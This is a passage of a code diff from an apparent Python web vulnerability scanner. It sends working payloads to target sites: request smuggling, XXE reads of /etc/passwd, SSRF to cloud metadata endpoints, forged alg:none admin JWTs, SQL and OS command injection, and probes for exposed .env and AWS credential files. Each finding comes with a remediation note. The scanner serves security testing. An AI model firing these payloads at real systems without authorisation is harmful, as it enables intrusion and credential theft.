+            f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+            f"Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n"
+            f"0\r\n\r\nGET /{marker} HTTP/1.1\r\nX: "
+        ).encode()
+        sock.send(smuggled)
+        time.sleep(1)
+        sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
+        resp = b""
+        sock.settimeout(3)
+        try:
+            while True:
+                chunk = sock.recv(8192)
+                if not chunk:
+                    break
+                resp += chunk
+                if len(resp) > 131072:
+                    break
+        except socket.timeout:
+            pass
+        sock.close()
+        resp_s = resp.decode(errors='ignore')
+        if marker in resp_s or resp_s.count("HTTP/1.") >= 2:
+            findings.append({
+                "type": "zero_day_smuggling",
+                "title": "Possible HTTP Request Smuggling (CL.TE desync)",
+                "severity": "CRITICAL", "cwe": "CWE-444", "owasp": "A05:2021", "url": base_url,
+                "evidence": resp_s[:3000],
+                "remediation": "Normalize CL/TE handling at frontend; use HTTP/2 end-to-end.",
+                "repro_ps": f"# PowerShell raw-socket CL.TE reproducer ({host}:{port}):\n$c = New-Object System.Net.Sockets.TcpClient('{host}', {port})\n# (see script for full payload — tls-wrap for https)",
+                "repro_curl": f"# Use 'smuggler.py' or a netcat session:\nprintf 'POST / HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /{marker} HTTP/1.1\\r\\nX: ' | openssl s_client -connect {host}:{port} -quiet",
+                "needs_manual_verification": True,
+            })
+    except Exception:
+        pass
+    return findings
+
+def host_header_injection(url: str) -> List[dict]:
+    findings = []
+    marker = f"hhi{int(time.time())}.invalid"
+    resp = http_request(url, headers={"Host": marker}, follow_redirects=False)
+    body = resp.get("body", "")
+    loc = resp.get("headers", {}).get("Location", "")
+    reflected_in_url = any(f"{scheme}://{marker}" in body for scheme in ("http", "https"))
+    reflected_in_loc = marker in loc
+    if reflected_in_url or reflected_in_loc:
+        repro = dual_repro("GET", url, {"Host": marker})
+        findings.append({
+            "type": "zero_day_host_injection",
+            "title": "Host Header Reflected into Response (password-reset poisoning risk)",
+            "severity": "HIGH", "cwe": "CWE-644", "owasp": "A05:2021", "url": url,
+            "evidence": f"Injected Host: {marker}\nLocation: {loc}\nIn-body URL reflection: {reflected_in_url}\n\n{body[:1500]}",
+            "remediation": "Use SERVER_NAME; validate Host against an allowlist.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": False,
+        })
+    return findings
+
+def crlf_injection(url: str) -> List[dict]:
+    findings = []
+    marker = f"crlf{int(time.time())}"
+    payloads = [
+        f"%0d%0aX-Injected:%20{marker}",
+        f"%0d%0aSet-Cookie:%20injected={marker}",
+    ]
+    for payload in payloads:
+        test_url = url + ("&" if "?" in url else "?") + f"redirect={payload}"
+        resp = http_request(test_url, follow_redirects=False)
+        hdr_blob = " ".join(f"{k}:{v}" for k, v in (resp.get("headers") or {}).items())
+        if marker in hdr_blob:
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "zero_day_crlf",
+                "title": "CRLF Injection → Header Injection",
+                "severity": "HIGH", "cwe": "CWE-113", "owasp": "A03:2021", "url": test_url,
+                "evidence": f"Injected header containing '{marker}' appears in response headers:\n{hdr_blob[:1500]}",
+                "remediation": "Strip CR/LF from user-controlled redirect/header inputs.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+            break
+    return findings
+
+def open_redirect(url: str) -> List[dict]:
+    findings = []
+    params = ["redirect", "redirect_uri", "return_to", "next", "url", "goto",
+              "callback", "continue", "destination", "out", "returnUrl", "target"]
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    marker_host = f"evil-{int(time.time())}.example"
+    payload_shapes = [
+        f"https://{marker_host}/",
+        f"//{marker_host}/",
+        f"/\\{marker_host}/",
+        f"https:{marker_host}",
+    ]
+    for param in params:
+        if param in qs:
+            continue
+        for shape in payload_shapes:
+            test_qs = dict(qs)
+            test_qs[param] = [shape]
+            new_query = urllib.parse.urlencode(test_qs, doseq=True)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+            resp = http_request(test_url, follow_redirects=False)
+            if resp["status"] in (301, 302, 303, 307, 308):
+                loc = resp.get("headers", {}).get("Location", "")
+                if marker_host in loc:
+                    repro = dual_repro("GET", test_url)
+                    findings.append({
+                        "type": "zero_day_open_redirect",
+                        "title": f"Open Redirect via '{param}' parameter",
+                        "severity": "MEDIUM", "cwe": "CWE-601", "owasp": "A01:2021",
+                        "url": test_url,
+                        "evidence": f"Redirects to attacker-controlled host: {loc}",
+                        "remediation": "Validate redirect targets against allowlist of same-origin paths.",
+                        "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                        "needs_manual_verification": False,
+                    })
+                    return findings
+    return findings
+
+def xxe_injection(url: str) -> List[dict]:
+    findings = []
+    payloads = [
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+         '<root>&xxe;</root>'),
+        ('<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
+         '<root>&xxe;</root>'),
+    ]
+    signatures = ["root:x:", "[extensions]", "; for 16-bit app support"]
+    for xml in payloads:
+        resp = http_request(url, method="POST", data=xml.encode(),
+                            headers={"Content-Type": "application/xml"})
+        if resp["status"] == 200 and any(sig in resp.get("body", "") for sig in signatures):
+            repro = dual_repro("POST", url, {"Content-Type": "application/xml"}, xml)
+            findings.append({
+                "type": "zero_day_xxe", "title": "XXE External Entity File Read",
+                "severity": "CRITICAL", "cwe": "CWE-611", "owasp": "A05:2021", "url": url,
+                "evidence": resp["body"][:2000],
+                "remediation": "Disable external entity resolution in XML parser.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+            break
+    return findings
+
+def ldap_injection_advanced(url: str) -> List[dict]:
+    findings = []
+    baseline = http_request(url)
+    if baseline["status"] not in (200, 500):
+        return findings
+    baseline_len = len(baseline.get("body", ""))
+    ldap_errors = ["ldap_search", "protocol error", "bad search filter",
+                   "inappropriate matching", "invalid dn syntax"]
+    payloads = ["*)(uid=*", "*)(|(uid=*", "admin)(&", "!(*)", "((|"]
+    for payload in payloads:
+        test_url = url + ("&" if "?" in url else "?") + f"user={urllib.parse.quote(payload)}"
+        resp = http_request(test_url)
+        body_low = resp.get("body", "").lower()
+        hit_err = any(s in body_low for s in ldap_errors)
+        big_delta = abs(len(resp.get("body", "")) - baseline_len) > 500
+        if resp["status"] == 500 and hit_err:
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "zero_day_ldap",
+                "title": "LDAP Injection (server error on malformed filter)",
+                "severity": "HIGH", "cwe": "CWE-90", "owasp": "A03:2021", "url": test_url,
+                "evidence": resp["body"][:2000],
+                "remediation": "Escape LDAP special characters per RFC 4515.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+            break
+        elif resp["status"] == 200 and big_delta and hit_err:
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "zero_day_ldap",
+                "title": "Possible LDAP Injection (baseline deviation + error string)",
+                "severity": "MEDIUM", "cwe": "CWE-90", "owasp": "A03:2021", "url": test_url,
+                "evidence": f"Baseline len {baseline_len} vs payload len {len(resp.get('body',''))}\n{resp['body'][:1500]}",
+                "remediation": "Escape LDAP special characters per RFC 4515.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": True,
+            })
+            break
+    return findings
+
+def subdomain_takeover(domain_or_url: str) -> List[dict]:
+    findings = []
+    host = urllib.parse.urlparse(domain_or_url).hostname or domain_or_url
+    cname = resolve_cname(host)
+    for scheme in ("https", "http"):
+        try:
+            resp = http_request(f"{scheme}://{host}", follow_redirects=False)
+        except Exception:
+            continue
+        body = resp.get("body", "") or ""
+        for cn_sub, fp, service, sev in TAKEOVER_FINGERPRINTS:
+            cname_match = bool(cname and cn_sub and cn_sub in cname)
+            body_match = fp in body
+            if body_match:
+                dns_cmd_ps = f"Resolve-DnsName -Name {host} -Type CNAME"
+                dns_cmd_sh = f"dig CNAME {host} +short"
+                http_repro = dual_repro("GET", f"{scheme}://{host}")
+                findings.append({
+                    "type": "zero_day_subdomain_takeover",
+                    "title": f"Dangling {service} — Subdomain Takeover Possible",
+                    "severity": sev, "cwe": "CWE-350", "owasp": "A01:2021",
+                    "url": f"{scheme}://{host}",
+                    "evidence": (f"CNAME: {cname or '(none or not resolvable)'}\n"
+                                 f"CNAME matches {service}: {cname_match}\n"
+                                 f"Fingerprint matched in body: '{fp}'\n"
+                                 f"Body preview:\n{body[:800]}"),
+                    "remediation": "Remove dangling DNS record OR reclaim the underlying resource.",
+                    "repro_ps":   f"{dns_cmd_ps}\n{http_repro['powershell']}",
+                    "repro_curl": f"{dns_cmd_sh}\n{http_repro['curl']}",
+                    "needs_manual_verification": False,
+                })
+                return findings
+    return findings
+
+def business_logic_bypass(url: str) -> List[dict]:
+    findings = []
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    if not qs:
+        return findings
+    baseline = http_request(url)
+    if baseline["status"] != 200:
+        return findings
+    for param, values in qs.items():
+        if not values or not re.match(r'^-?\d+\.?\d*$', values[0]):
+            continue
+        for test_val in ["-1", "0", "999999999", "-999999", "0.01", "-0.01"]:
+            new_qs = dict(qs)
+            new_qs[param] = [test_val]
+            new_query = urllib.parse.urlencode(new_qs, doseq=True)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+            resp = http_request(test_url)
+            if resp["status"] != 200:
+                continue
+            body = resp.get("body", "")
+            reflected = bool(re.search(rf'"[^"]+"\s*:\s*-?{re.escape(test_val)}([,}}\s])', body))
+            err_absent = not any(e in body.lower() for e in
+                                  ("invalid", "error", "must be positive",
+                                   "out of range", "bad request"))
+            if reflected and err_absent:
+                repro = dual_repro("GET", test_url)
+                findings.append({
+                    "type": "zero_day_business_logic",
+                    "title": f"Business Logic: negative/zero value accepted on '{param}'",
+                    "severity": "HIGH", "cwe": "CWE-841", "owasp": "A04:2021", "url": test_url,
+                    "evidence": f"Tested {param}={test_val} — server accepted and echoed value "
+                                f"without validation error:\n{body[:1500]}",
+                    "remediation": "Enforce positive-integer validation server-side; "
+                                   "check business rules (e.g., min price, min quantity).",
+                    "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                    "needs_manual_verification": True,
+                })
+                return findings
+    return findings
+
+def parameter_pollution(url: str) -> List[dict]:
+    findings = []
+    marker = f"pp{int(time.time())}"
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    for param in qs.keys():
+        test_url = url + f"&{param}={marker}"
+        resp = http_request(test_url)
+        if resp["status"] == 200 and marker in resp.get("body", ""):
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "zero_day_param_pollution",
+                "title": f"Duplicate parameter '{param}' processed (HPP)",
+                "severity": "LOW", "cwe": "CWE-20", "owasp": "A05:2021", "url": test_url,
+                "evidence": f"Second occurrence of {param}={marker} reflected: {resp['body'][:800]}",
+                "remediation": "Choose first or last occurrence consistently; reject duplicates.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": True,
+            })
+            break
+    return findings
+
+def email_header_injection(url: str) -> List[dict]:
+    findings = []
+    if not any(k in url.lower() for k in ("email", "contact", "mail", "feedback", "support")):
+        return findings
+    marker = f"ehi{int(time.time())}"
+    payload = f"attacker@example.invalid%0d%0aBcc:%20{marker}@example.invalid"
+    test_url = url + ("&" if "?" in url else "?") + f"email={payload}"
+    resp = http_request(test_url)
+    if marker in resp.get("body", "") or "bcc" in resp.get("body", "").lower():
+        repro = dual_repro("GET", test_url)
+        findings.append({
+            "type": "zero_day_email_header",
+            "title": "Email Header Injection (CRLF in email param)",
+            "severity": "HIGH", "cwe": "CWE-93", "owasp": "A03:2021", "url": test_url,
+            "evidence": resp["body"][:2000],
+            "remediation": "Strip CR/LF from email inputs; use mail library that escapes headers.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": True,
+        })
+    return findings
+
+def cors_misconfiguration(base_url: str) -> List[dict]:
+    findings = []
+    evil = f"https://evil-{int(time.time())}.example"
+    resp = http_request(base_url, headers={"Origin": evil})
+    acao = resp.get("headers", {}).get("Access-Control-Allow-Origin", "") or ""
+    acac = resp.get("headers", {}).get("Access-Control-Allow-Credentials", "") or ""
+    if evil in acao and acac.lower() == "true":
+        repro = dual_repro("GET", base_url, {"Origin": evil})
+        findings.append({
+            "type": "zero_day_cors",
+            "title": "CORS Misconfig: Origin reflected + credentials allowed",
+            "severity": "HIGH", "cwe": "CWE-942", "owasp": "A05:2021", "url": base_url,
+            "evidence": f"Access-Control-Allow-Origin: {acao}\n"
+                        f"Access-Control-Allow-Credentials: {acac}\n"
+                        f"(Any origin can read authenticated responses.)",
+            "remediation": "Use a strict allowlist; never reflect Origin when credentials are allowed.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": False,
+        })
+    return findings
+
+def test_sql_injection(url: str, param: str, value: str = "1") -> List[dict]:
+    findings = []
+    payloads = ["'", "\"", "1' OR '1'='1", "1' OR 1=1--",
+                "' UNION SELECT NULL--", "1);--"]
+    signatures = ["sql syntax", "mysql_fetch", "unclosed quotation", "sqlite_error",
+                  "postgresql", "ora-", "microsoft ole db", "you have an error in your sql"]
+    for payload in payloads:
+        parsed = urllib.parse.urlparse(url)
+        qs = urllib.parse.parse_qs(parsed.query)
+        qs[param] = [value + payload]
+        new_query = urllib.parse.urlencode(qs, doseq=True)
+        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+        resp = http_request(test_url)
+        body_low = resp.get("body", "").lower()
+        if any(s in body_low for s in signatures):
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "sql_injection", "title": "SQL Injection (error-based)",
+                "severity": "HIGH", "cwe": "CWE-89", "owasp": "A03:2021",
+                "url": test_url, "parameter": param, "payload": payload,
+                "evidence": resp["body"][:2000],
+                "remediation": "Use parameterized queries / prepared statements.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+            break
+    return findings
+
+def test_idor(url: str, param: str, base_id: str = "1") -> List[dict]:
+    findings = []
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    if param not in qs:
+        return findings
+    current = qs[param][0]
+    if not current.isdigit():
+        return findings
+
+    our_resp = http_request(url)
+    if our_resp["status"] != 200:
+        return findings
+    our_body = our_resp.get("body", "")
+    our_emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', our_body))
+
+    for offset in (-1, 1, 100, 999):
+        test_id = str(int(current) + offset)
+        if test_id == current or int(test_id) < 0:
+            continue
+        qs_copy = dict(qs)
+        qs_copy[param] = [test_id]
+        new_query = urllib.parse.urlencode(qs_copy, doseq=True)
+        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+        resp = http_request(test_url)
+        if resp["status"] != 200 or len(resp.get("body", "")) < 100:
+            continue
+        resp_body = resp.get("body", "")
+        if resp_body == our_body:
+            continue
+        other_emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', resp_body))
+        new_emails = other_emails - our_emails
+        id_echoed = (f'"id":{test_id}' in resp_body
+                     or f'"id":"{test_id}"' in resp_body
+                     or f'"user_id":{test_id}' in resp_body)
+        if new_emails or id_echoed:
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "idor",
+                "title": "IDOR — Spoofed ID returns different user's data",
+                "severity": "HIGH", "cwe": "CWE-639", "owasp": "A01:2021", "url": test_url,
+                "parameter": param, "original_id": current, "tested_id": test_id,
+                "evidence": f"New emails vs baseline: {list(new_emails)[:3]}\n"
+                            f"ID echoed for spoofed value: {id_echoed}\n\n"
+                            f"{resp_body[:1500]}",
+                "remediation": "Object-level authorization tied to the session user, not to "
+                               "a request-supplied ID.",
+                "repro_ps":   f"# Baseline:\n{dual_repro('GET', url)['powershell']}\n"
+                              f"# Spoofed:\n{repro['powershell']}",
+                "repro_curl": f"# Baseline:\n{dual_repro('GET', url)['curl']}\n"
+                              f"# Spoofed:\n{repro['curl']}",
+                "needs_manual_verification": False,
+            })
+            break
+    return findings
+
+def test_xss(url: str, param: str) -> List[dict]:
+    findings = []
+    marker = f"xss{int(time.time())}"
+    probes = [
+        f'<svg/onload=/*{marker}*/>',
+        f'"><img src=x onerror={marker}>',
+        f"';{marker};//",
+    ]
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    if param not in qs:
+        return findings
+    for probe in probes:
+        qs_copy = dict(qs)
+        qs_copy[param] = [probe]
+        test_url = urllib.parse.urlunparse(parsed._replace(
+            query=urllib.parse.urlencode(qs_copy, doseq=True)))
+        resp = http_request(test_url)
+        if resp["status"] != 200:
+            continue
+        body = resp.get("body", "")
+        if probe not in body:
+            continue
+        # Reject encoded-only reflection
+        encoded_variants = [
+            probe.replace("<", "&lt;").replace(">", "&gt;"),
+            probe.replace("<", "\\u003c").replace(">", "\\u003e"),
+            probe.replace('"', "&quot;"),
+            probe.replace("'", "&#39;"),
+        ]
+        encoded_present = any(v in body for v in encoded_variants if v != probe)
+        raw_still_present = body.count(probe) > (body.count(encoded_variants[0]) if encoded_variants else 0)
+        if encoded_present and not raw_still_present:
+            continue
+        idx = body.find(probe)
+        repro = dual_repro("GET", test_url)
+        findings.append({
+            "type": "xss", "title": "Reflected XSS (unencoded raw reflection)",
+            "severity": "MEDIUM", "cwe": "CWE-79", "owasp": "A03:2021",
+            "url": test_url, "parameter": param, "payload": probe,
+            "evidence": f"Raw probe reflected without encoding at offset {idx}:\n"
+                        f"...{body[max(0,idx-150):idx+len(probe)+150]}...",
+            "remediation": "Context-aware output encoding; CSP; HTML template auto-escape.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": False,
+        })
+        break
+    return findings
+
+def test_path_traversal(url: str, param: str) -> List[dict]:
+    findings = []
+    payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
+                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                "....//....//....//etc/passwd"]
+    signatures = [re.compile(r'root:x?:\d+:\d+:'),
+                  re.compile(r'\[extensions\]'),
+                  re.compile(r'; for 16-bit app support', re.I)]
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    if param not in qs:
+        return findings
+    for payload in payloads:
+        qs_copy = dict(qs)
+        qs_copy[param] = [payload]
+        test_url = urllib.parse.urlunparse(parsed._replace(
+            query=urllib.parse.urlencode(qs_copy, doseq=True)))
+        resp = http_request(test_url)
+        if resp["status"] != 200:
+            continue
+        body = resp.get("body", "")
+        if any(sig.search(body) for sig in signatures):
+            repro = dual_repro("GET", test_url)
+            findings.append({
+                "type": "path_traversal",
+                "title": "Path Traversal — OS file contents returned",
+                "severity": "HIGH", "cwe": "CWE-22", "owasp": "A01:2021",
+                "url": test_url, "parameter": param, "payload": payload,
+                "evidence": body[:2000],
+                "remediation": "Canonicalize paths; allowlist filenames; drop .. sequences.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+            break
+    return findings
+
+def test_ssrf(url: str, param: str) -> List[dict]:
+    findings = []
+    payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://127.0.0.1:22/",
+        "file:///etc/passwd",
+    ]
+    signatures = [re.compile(r'ami-id'),
+                  re.compile(r'instance-id'),
+                  re.compile(r'security-credentials'),
+                  re.compile(r'computeMetadata'),
+                  re.compile(r'root:x?:\d+:\d+:'),
+                  re.compile(r'SSH-\d\.\d')]
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    if param not in qs:
+        return findings
+    for payload in payloads:
+        qs_copy = dict(qs)
+        qs_copy[param] = [payload]
+        test_url = urllib.parse.urlunparse(parsed._replace(
+            query=urllib.parse.urlencode(qs_copy, doseq=True)))
+        headers = {"Metadata-Flavor": "Google"} if "metadata.google" in payload else None
+        resp = http_request(test_url, headers=headers)
+        if resp["status"] != 200:
+            continue
+        body = resp.get("body", "")
+        if any(sig.search(body) for sig in signatures):
+            repro = dual_repro("GET", test_url, headers)
+            findings.append({
+                "type": "ssrf", "title": "Server-Side Request Forgery",
+                "severity": "CRITICAL", "cwe": "CWE-918", "owasp": "A10:2021",
+                "url": test_url, "parameter": param, "payload": payload,
+                "evidence": body[:2000],
+                "remediation": "Allowlist outbound destinations; block metadata IPs; "
+                               "enforce IMDSv2 on AWS.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+            break
+    return findings
+
+def test_graphql_introspection(url: str) -> List[dict]:
+    findings = []
+    if "/graphql" not in url and "/query" not in url:
+        return findings
+    body = json.dumps({"query": "{ __schema { types { name fields { name } } } }"})
+    resp = http_request(url, method="POST", data=body.encode(),
+                        headers={"Content-Type": "application/json"})
+    if resp["status"] == 200 and "__schema" in resp.get("body", "") and '"types"' in resp.get("body", ""):
+        repro = dual_repro("POST", url, {"Content-Type": "application/json"}, body)
+        findings.append({
+            "type": "graphql_introspection",
+            "title": "GraphQL Introspection Enabled in Production",
+            "severity": "MEDIUM", "cwe": "CWE-200", "owasp": "A01:2021", "url": url,
+            "evidence": resp["body"][:2000],
+            "remediation": "Disable introspection in production environments.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": True,
+        })
+    return findings
+
+def test_jwt_weakness(url: str, jwt_token: str) -> List[dict]:
+    findings = []
+    if not jwt_token:
+        return findings
+    payload = {"admin": True, "user": "attacker", "marker": RUN_MARKER}
+    eh = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
+    ep = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+    none_jwt = f"{eh}.{ep}."
+    resp = http_request(url, headers={"Authorization": f"Bearer {none_jwt}"})
+    if resp["status"] == 200 and RUN_MARKER in resp.get("body", ""):
+        repro = dual_repro("GET", url, {"Authorization": f"Bearer {none_jwt}"})
+        findings.append({
+            "type": "jwt_none_algorithm",
+            "title": "JWT 'none' Algorithm Accepted (forged claims honored)",
+            "severity": "CRITICAL", "cwe": "CWE-345", "owasp": "A02:2021", "url": url,
+            "evidence": f"Forged JWT with alg:none containing marker '{RUN_MARKER}' was accepted.\n"
+                        f"Response:\n{resp['body'][:2000]}",
+            "remediation": "Reject alg:none; verify signatures; pin algorithms.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": False,
+        })
+    return findings
+
+# =============================================================================
+# Additional config / exposed endpoints
+# =============================================================================
+def exposed_config_check(base: str) -> List[dict]:
+    findings = []
+    probes = [
+        ("/.git/HEAD",              re.compile(r"^ref:\s+refs/"),                  "Exposed .git/HEAD",             "HIGH"),
+        ("/.git/config",            re.compile(r"\[core\]"),                       "Exposed .git/config",           "HIGH"),
+        ("/.env",                   re.compile(r"(?m)^[A-Z_][A-Z0-9_]*="),         "Exposed .env",                  "CRITICAL"),
+        ("/.env.local",             re.compile(r"(?m)^[A-Z_][A-Z0-9_]*="),         "Exposed .env.local",            "CRITICAL"),
+        ("/.env.production",        re.compile(r"(?m)^[A-Z_][A-Z0-9_]*="),         "Exposed .env.production",       "CRITICAL"),
+        ("/.npmrc",                 re.compile(r"_authToken"),                     "Exposed .npmrc with token",     "HIGH"),
+        ("/.aws/credentials",       re.compile(r"aws_access_key_id", re.I),        "Exposed AWS credentials",       "CRITICAL"),
+        ("/config.php.bak",         re.compile(r"<\?php"),                         "Exposed PHP config backup",     "HIGH"),
+        ("/wp-config.php.bak",      re.compile(r"DB_PASSWORD"),                    "Exposed WP config backup",      "CRITICAL"),
+        ("/web.config",             re.compile(r"<configuration>"),                "Exposed web.config",            "MEDIUM"),
+        ("/server-status",          re.compile(r"Apache Server Status"),           "Apache server-status exposed",  "MEDIUM"),
+        ("/actuator/env",           re.compile(r"activeProfiles|systemEnvironment"),"Spring Actuator /env exposed",  "CRITICAL"),
+        ("/actuator/heapdump",      None,                                          "Spring Actuator heapdump",      "CRITICAL"),
+        ("/actuator/mappings",      re.compile(r"handler|predicate"),              "Spring Actuator /mappings",     "MEDIUM"),
+        ("/phpinfo.php",            re.compile(r"PHP Version"),                    "phpinfo() exposed",             "MEDIUM"),
+        ("/.DS_Store",              None,                                          "Exposed .DS_Store",             "LOW"),
+    ]
+    for path, sig, title, sev in probes:
+        url = base.rstrip("/") + path
+        resp = http_request(url)
+        if resp["status"] != 200:
+            continue
+        body = resp.get("body", "")
+        if len(body) < 10:
+            continue
+        if sig is None:
+            if path.endswith("heapdump") and len(body) > 1000000:
+                matched = True
+            elif path == "/.DS_Store" and b"Bud1" in body.encode('latin-1', errors='ignore'):
+                matched = True
+            else:
+                matched = False
+        else:
+            matched = bool(sig.search(body))
+        if matched:
+            repro = dual_repro("GET", url)
+            findings.append({
+                "type": "exposed_config", "title": title,
+                "severity": sev, "cwe": "CWE-538", "owasp": "A05:2021", "url": url,
+                "evidence": body[:1500] if sig else f"(binary content, {len(body)} bytes)",
+                "remediation": "Remove file from web root; add to deployment .ignore; "
+                               "rotate any secrets contained within.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+    return findings
+
+def method_enumeration(url: str) -> List[dict]:
+    findings = []
+    base = http_request(url, method="GET")
+    if base["status"] == 0:
+        return findings
+    for method in ("PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "PROPFIND"):
+        data = b'{}' if method in ("PUT", "PATCH") else None
+        hdrs = {"Content-Type": "application/json"} if method in ("PUT", "PATCH") else None
+        resp = http_request(url, method=method, data=data, headers=hdrs)
+        if method == "OPTIONS" and resp["status"] == 200:
+            allow = (resp.get("headers", {}).get("Allow", "")
+                     or resp.get("headers", {}).get("allow", ""))
+            if any(v in allow for v in ("PUT", "DELETE", "PATCH")):
+                repro = dual_repro("OPTIONS", url)
+                findings.append({
+                    "type": "verb_enum",
+                    "title": f"Write methods advertised via OPTIONS: {allow}",
+                    "severity": "LOW", "cwe": "CWE-650", "owasp": "A05:2021", "url": url,
+                    "evidence": f"Allow: {allow}",
+                    "remediation": "Disable unused verbs at the web layer.",
+                    "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                    "needs_manual_verification": True,
+                })
+        elif method == "TRACE" and resp["status"] == 200 and "TRACE" in resp.get("body", ""):
+            repro = dual_repro("TRACE", url)
+            findings.append({
+                "type": "xst", "title": "HTTP TRACE Enabled (Cross-Site Tracing)",
+                "severity": "LOW", "cwe": "CWE-693", "owasp": "A05:2021", "url": url,
+                "evidence": resp["body"][:800],
+                "remediation": "Disable TRACE method at web server.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+        elif (method in ("PUT", "DELETE", "PATCH")
+              and resp["status"] in (200, 201, 204)
+              and base["status"] in (401, 403)):
+            repro = dual_repro(method, url, hdrs, '{}' if data else None)
+            findings.append({
+                "type": "verb_auth_bypass",
+                "title": f"Auth bypass: {method} succeeds where GET is {base['status']}",
+                "severity": "CRITICAL", "cwe": "CWE-284", "owasp": "A01:2021", "url": url,
+                "evidence": f"GET -> {base['status']}, {method} -> {resp['status']}\n\n"
+                            f"{resp['body'][:1500]}",
+                "remediation": "Apply authentication/authorization uniformly across all HTTP methods.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+    return findings
+
+def timing_based_tests(url: str, param: str) -> List[dict]:
+    findings = []
+    parsed = urllib.parse.urlparse(url)
+    qs = urllib.parse.parse_qs(parsed.query)
+    if param not in qs:
+        return findings
+    baseline = []
+    for _ in range(3):
+        t = time.time()
+        http_request(url, timeout=20)
+        baseline.append(time.time() - t)
+    base_avg = sum(baseline) / len(baseline)
+    time_payloads = [
+        ("1' AND SLEEP(6)-- -",              "MySQL time-based SQLi",    "CWE-89"),
+        ("1); WAITFOR DELAY '0:0:6'-- -",    "MSSQL time-based SQLi",    "CWE-89"),
+        ("1' AND pg_sleep(6)-- -",           "PostgreSQL time-based SQLi","CWE-89"),
+        ("1' AND 1=(SELECT 1 FROM PG_SLEEP(6))-- -", "PostgreSQL subquery SQLi","CWE-89"),
+        ("$(sleep 6)",                       "OS command injection",     "CWE-78"),
+        ("`sleep 6`",                        "OS command injection",     "CWE-78"),
+        ("|sleep 6",                         "OS command injection",     "CWE-78"),
+    ]
+    for payload, label, cwe in time_payloads:
+        qs_copy = dict(qs)
+        qs_copy[param] = [payload]
+        test_url = urllib.parse.urlunparse(parsed._replace(
+            query=urllib.parse.urlencode(qs_copy, doseq=True)))
+        t = time.time()
+        resp = http_request(test_url, timeout=25)
+        delta = time.time() - t
+        if delta > base_avg + 5 and resp["status"] != 0:
+            t2 = time.time()
+            http_request(test_url, timeout=25)
+            delta2 = time.time() - t2
+            if delta2 > base_avg + 5:
+                repro = dual_repro("GET", test_url)
+                findings.append({
+                    "type": "blind_injection",
+                    "title": f"Time-based injection: {label}",
+                    "severity": "HIGH", "cwe": cwe, "owasp": "A03:2021",
+                    "url": test_url, "parameter": param, "payload": payload,
